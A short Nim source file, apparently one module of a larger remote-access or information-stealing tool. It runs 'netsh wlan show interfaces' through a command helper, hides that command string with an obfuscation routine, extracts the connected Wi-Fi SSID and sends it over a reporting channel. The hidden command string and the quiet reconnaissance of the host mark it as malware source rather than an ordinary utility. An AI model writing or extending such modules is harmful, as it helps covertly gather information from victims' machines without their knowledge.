from strutils import split
from strutils import contains

import ../functions/runCmd

from ../channels import mainChannel

import ../functions/hideString

proc getConnectedWifi(): void =
  let netshOutout1: string = runCmd d e"netsh wlan show interfaces"

  for line in netshOutout1.split "\n":
    if line.contains("SSID") and not line.contains("BSSID"):
      let SSID: string = "\"" & line.split(": ")[1] & "\""

      mainChannel.send "connected to: " & SSID


proc initConnectedWifiThread*(): void {.thread.} =
  getConnectedWifi()
